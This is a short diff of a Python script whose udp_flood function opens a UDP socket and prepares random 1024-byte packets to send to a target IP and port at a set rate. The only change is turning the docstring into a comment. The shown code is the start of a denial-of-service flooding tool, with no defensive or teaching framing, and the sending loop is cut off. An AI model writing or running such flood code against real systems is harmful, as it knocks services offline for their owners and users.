@@ -3,9 +3,7 @@ import time
 import random
 
 def udp_flood(target_ip, target_port, duration, rate):
-    """
-    Sends UDP packets to a target at a specified rate for a given duration.
-    """
+    # Sends UDP packets to a target at a specified rate for a given duration.
     print(f"[INFO] Starting UDP flood on {target_ip}:{target_port} for {duration}s at ~{rate} pkts/s.")
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     data = random._urandom(1024)
